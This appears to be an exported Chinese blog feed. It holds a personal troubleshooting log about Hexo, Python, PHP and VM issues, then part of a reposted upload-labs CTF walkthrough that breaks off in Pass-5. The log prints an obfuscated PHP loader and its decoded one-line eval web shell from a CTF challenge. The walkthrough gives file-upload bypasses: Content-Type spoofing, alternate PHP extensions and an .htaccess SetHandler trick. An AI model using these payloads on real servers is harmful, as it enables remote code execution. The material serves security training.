<h3 id="无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够"><a href="#无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够" class="headerlink" title="无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)"></a>无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)</h3><p><a href="http://blog.csdn.net/zlchina1989/article/details/6033198">无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)  无法对状态列表目录加锁(/var/lib/dpkg/)，请查看您是否正以 root 用户运行？</a></p>
<p>解决的办法：在前面加sudo，也就是sudo apt-get install xxxxx</p>
<p>使得自己的指令拥有管理员权限。</p>
<h3 id="Hexo修改字体"><a href="#Hexo修改字体" class="headerlink" title="Hexo修改字体"></a>Hexo修改字体</h3><p><a href="https://blog.csdn.net/m0_46296826/article/details/115350456">https://blog.csdn.net/m0_46296826/article/details/115350456</a></p>
<h3 id="Hexo封面图片"><a href="#Hexo封面图片" class="headerlink" title="Hexo封面图片"></a>Hexo封面图片</h3><p>免费制作图床的网址：</p>
<p><a href="https://imgurl.org/">ImgURL免费图床</a></p>
<p>经过这里加工后，选择合适的路径</p>
<p>在博客文章的cover（可以手动添加)后面加上</p>
<p>就可以有漂亮的文章封面啦！</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210830165519649.png" alt="image-20210830165519649"></p>
<p>不过这个是暂时的，doge</p>
<p>取消封面的话，只需要在cover后面加上false就好</p>
<h3 id="AttributeError-module-‘datetime’-has-no-attribute-‘now’"><a href="#AttributeError-module-‘datetime’-has-no-attribute-‘now’" class="headerlink" title="AttributeError: module ‘datetime’ has no attribute ‘now’"></a>AttributeError: module ‘datetime’ has no attribute ‘now’</h3><p>今天python代码出现这样的报错，</p>
<p>经过上网查询得知，原来是我文件命名和所调用库一样，导致</p>
<p>导入时回覆盖datetime库</p>
<p>这是别人文章的原话：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">datetime是<span class="hljs-keyword">python</span>中的内置模块，正常应该不会报错，检查后发现是一个很低级错误， 我给我的文件名起的就是datetime.<span class="hljs-keyword">py</span> 所以导入时会覆盖datetime这个包。将文件名字改了就好了。<br></code></pre></td></tr></table></figure>

<h3 id="Turtle库如何绘制用户想要图案"><a href="#Turtle库如何绘制用户想要图案" class="headerlink" title="Turtle库如何绘制用户想要图案"></a>Turtle库如何绘制用户想要图案</h3><p>上网查了一下，在一篇turtle文章下面找到了一句话</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">用鼠标点击事先确定位置，返回值为一个坐标<br></code></pre></td></tr></table></figure>

<p>这句话令我想法多了起来，现有的想法是有什么代码可以把坐标值打印</p>
<p>然后根据坐标值编写相应的调用turtle库的代码</p>
<h3 id="ReadTimeoutError-HTTPSConnectionPool-host-’files-pythonhosted-org’-port-443-Read-timed-out"><a href="#ReadTimeoutError-HTTPSConnectionPool-host-’files-pythonhosted-org’-port-443-Read-timed-out" class="headerlink" title="ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out."></a>ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out.</h3><p><a href="https://www.cnblogs.com/ring1992/p/13971119.html">Python报错ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out. - Ring_1992 - 博客园 (cnblogs.com)</a></p>
<h3 id="visual-code安装php运行配置环境"><a href="#visual-code安装php运行配置环境" class="headerlink" title="visual code安装php运行配置环境"></a>visual code安装php运行配置环境</h3><p><a href="https://www.bilibili.com/video/BV1XE41147Kc?p=1&share_medium=android&share_plat=android&share_session_id=7ca75de8-83ff-4a4b-a87e-afe4faf6360c&share_source=QQ&share_tag=s_i&timestamp=1633683248&unique_k=dejn9X">小白必看的php入门教程，php编辑神器推荐，visual studio code（vscode），教大家装插件后提高效率_哔哩哔哩_bilibili</a></p>
<p><a href="https://www.bilibili.com/video/BV14E411L7kL?p=1&share_medium=android&share_plat=android&share_session_id=ed416c37-a6c1-4679-82ed-5d3283230595&share_source=QQ&share_tag=s_i&timestamp=1633683271&unique_k=tORPhM">【php基础教程】php path环境变量的配置，解决vscode不能右键运行php代码的问题_哔哩哔哩_bilibili</a></p>
<p>第一个视频教学如何安装、建议的PHP插件，比如Run Code</p>
<p>第二个视频教学添加环境变量，运行是确保不会乱码</p>
<p>效果图：</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211009200155499.png" alt="image-20211009200155499"></p>
<h3 id="Hexo部署到coding"><a href="#Hexo部署到coding" class="headerlink" title="Hexo部署到coding"></a>Hexo部署到coding</h3><p>为了让我的博客访问能够更快</p>
<p>我今天尝试了将hexo部署到coding，费了我好大的劲（博客差点崩了，doge）</p>
<p>先记录一下所用的文章：</p>
<p><a href="https://cloud.tencent.com/developer/article/1580237">Hexo博客部署到码云和Coding - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="https://blog.csdn.net/BEICHENx1/article/details/104237588">(5条消息) 加速Hexo博客的访问速度——将博客部署到coding_BEICHENx1的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/BlowMoons/article/details/100544444">(5条消息) Hexo部署到Coding上_BlowMoons的博客-CSDN博客_hexo部署到coding</a></p>
<p><a href="https://blog.csdn.net/weixin_43631997/article/details/115618569?ops_request_misc=%7B%22request_id%22:%22163411490316780264094488%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=163411490316780264094488&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-115618569.first_rank_v2_pc_rank_v29&utm_term=coding%E5%88%9B%E5%BB%BA%E9%A1%B5%E9%9D%A2&spm=1018.2226.3001.4187">(5条消息) Coding创建项目，并用git把本地上传到Coding_Aurora1217的博客-CSDN博客_coding创建目录</a></p>
<p><a href="https://jingyan.baidu.com/article/d2b1d102d4527e5c7e37d40d.html">Coding中如何增加SSH公钥-百度经验 (baidu.com)</a></p>
<p><a href="https://www.zhihu.com/question/33544309">(1 封私信 / 2 条消息) Coding.net 是什么网站？和 Github 有什么区别？ - 知乎 (zhihu.com)</a></p>
<h3 id="PHP混淆加密解密"><a href="#PHP混淆加密解密" class="headerlink" title="PHP混淆加密解密"></a>PHP混淆加密解密</h3><p><a href="https://www.zhaoyuanma.com/phpjm.html">php解密加密|php混淆破解|phpjm破解|phpdp神盾破解|php威盾破解|php微盾破解|tianyiw破解|php源码破解|php在线破解|php反编译|zend6解密|Zend Guard 6 破解 (zhaoyuanma.com)</a></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&lt;?php<br>define(<span class="hljs-string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, __FILE_<span class="hljs-number">_</span>);<br>$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ = urldecode(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br>$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;3&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;6&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;33&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;30&#125;</span>;<br>$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;33&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;10&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;24&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;10&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;24&#125;</span>;<br>$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV = $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ<span class="hljs-string">&#123;0&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;18&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;3&#125;</span> . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ<span class="hljs-string">&#123;0&#125;</span> . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ<span class="hljs-string">&#123;1&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;24&#125;</span>;<br>$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;7&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;13&#125;</span>;<br>$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC.= $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;22&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;36&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;29&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;26&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;30&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;32&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;35&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;26&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;30&#125;</span>;<br><span class="hljs-keyword">eval</span>($BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC(<span class="hljs-string">&quot;&quot;</span>)); ?&gt;<br></code></pre></td></tr></table></figure>

<p>网站解密后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//加密方式：php源码混淆类加密。免费版地址:https://www.zhaoyuanma.com/phpjm.html 免费版不能解密,可以使用VIP版本。</span><br><span class="hljs-comment">//此程序由【找源码】http://Www.ZhaoYuanMa.Com (免费版）在线逆向还原，QQ：7530782 </span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);<br>@<span class="hljs-keyword">eval</span>($_POST[ymlisisisiook]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>题目地址：<a href="https://ctf.bugku.com/challenges/detail/id/107.html">getshell - Bugku CTF</a></p>
<h3 id="关于虚拟机突然没有网络问题解决"><a href="#关于虚拟机突然没有网络问题解决" class="headerlink" title="关于虚拟机突然没有网络问题解决"></a>关于虚拟机突然没有网络问题解决</h3><p>之前应该是为了打AWD，把网络连接配置给重置了</p>
<p>导致虚拟机那块的网络没有跟上，于是都没有网络 ==</p>
<p>还好今天试了配置ubuntu的网络</p>
<p>参考：<a href="https://blog.csdn.net/tiramisu_L/article/details/80398451">Ubuntu网络配置（NAT模式）_tiramisu_L的博客-CSDN博客</a></p>
<p>最重要还是重置了虚拟机网络配置</p>
<p>1.</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145702228.png" alt="image-20211022145702228"></p>
<p>2.</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145736426.png" alt="image-20211022145736426"></p>
<p>3.</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145756792.png" alt="image-20211022145756792"></p>
<p>4.</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145813165.png" alt="image-20211022145813165"></p>
<p>5.</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145828373.png" alt="image-20211022145828373"></p>
<p>6.</p>
<p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145852767.png" alt="image-20211022145852767"></p>
<h3 id="phpstudy无法启动mysql"><a href="#phpstudy无法启动mysql" class="headerlink" title="phpstudy无法启动mysql"></a>phpstudy无法启动mysql</h3><p>可以在CMD中输入sc delete mysql删除掉mysql,这样就可以在phpstudy中开启MySQL了</p>
]]></content>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs</title>
    <url>/2021/02/21/2021/upload-labs/upload-labs/</url>
    <content><![CDATA[<p> 转载于：<a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">https://blog.csdn.net/weixin_44677409/article/details/92799366</a> 作者：小白白@</p>
<p>（不懂为什么里面一些关卡的方法作者可以绕过，而我就是提示不可以上传该文件类型，伤脑筋。。）</p>
<p>（经过不断失败后，明白原因了：与配置文件php.ini有关，需要修改配置；其次文件缺失，因为可能从网络上白获取的文件吧，好多版本存在关卡不足、对应关卡源代码不对等问题，现在来看在训练的三个靶场中，SQL labs是后期难度最大、时间最长得了。）</p>
<p><img src="https://img-blog.csdnimg.cn/20190619151237843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-1-js检查"><a href="#Pass-1-js检查" class="headerlink" title="Pass-1-js检查"></a>Pass-1-js检查</h2><p><strong>源码：</strong><br><img src="https://img-blog.csdnimg.cn/20190618192730245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>因为是前端js校验，因此可以直接禁用js<br>或者用burp抓包修改文件类型（上传1.jpg修改为1.php）<br><img src="https://img-blog.csdnimg.cn/20190618201625999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618201727918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-2-只验证Content-type"><a href="#Pass-2-只验证Content-type" class="headerlink" title="Pass-2-只验证Content-type"></a>Pass-2-只验证Content-type</h2><p><strong>源码：</strong></p>
<p><img src="https://img-blog.csdnimg.cn/20190618202240670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>仅仅判断content-type类型，因此上传1.php抓包修改content-type为图片类型：image/jpeg、image/png、image/gif</p>
<p><img src="https://img-blog.csdnimg.cn/20190618202602681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061820285334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-3-黑名单绕过"><a href="#Pass-3-黑名单绕过" class="headerlink" title="Pass-3-黑名单绕过"></a>Pass-3-黑名单绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;            <br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;<br>                 $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819202122232425262728</span><br></code></pre></td></tr></table></figure>

<p>用黑名单不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀的文件<br>但可以上传<code>.phtml .phps .php5 .pht</code><br>前提是apache的httpd.conf中有如下配置代码</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span> <span class="hljs-string">.phps</span> <span class="hljs-string">.php5</span> <span class="hljs-string">.pht</span><br>1<br></code></pre></td></tr></table></figure>

<p>因此抓包修改为1.php5上传，回复包里有上传路径<br><img src="https://img-blog.csdnimg.cn/20190618205539849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190618205914362.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-4-htaccess绕过"><a href="#Pass-4-htaccess绕过" class="headerlink" title="Pass-4-.htaccess绕过"></a>Pass-4-.htaccess绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>);<br>        $file_name = trim($_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        $file_name = deldot($file_name);<span class="hljs-comment">//删除文件名末尾的点</span><br>        $file_ext = strrchr($file_name, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        $file_ext = strtolower($file_ext); <span class="hljs-comment">//转换为小写</span><br>        $file_ext = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $file_ext);<span class="hljs-comment">//去除字符串::$DATA</span><br>        $file_ext = trim($file_ext); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;<br>            $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            $img_path = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.$file_name;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;<br>                $is_upload = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                $msg = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            $msg = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        $msg = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-number">12345678910111213141516171819202122232425262728</span><br></code></pre></td></tr></table></figure>

<p>黑名单拒绝了几乎所有有问题的后缀名，除了.htaccess<br>前提条件（<code>1.mod_rewrite模块开启。2.AllowOverride All</code>）<br>因此先上传一个.htaccess文件，内容如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">SetHandler application/x-httpd-php <br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>这样所有文件都会当成php来解析<br><img src="https://img-blog.csdnimg.cn/20190619210642615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619210904393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190619210924251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Pass-5-大小写绕过"><a href="#Pass-5-大小写绕过" class="headerlink" title="Pass-5-大小写绕过"></a>Pass-5-大小写绕过</h2><p><strong>源码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$is_upload = <span class="hljs-literal">false</span>;<br>$msg = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span 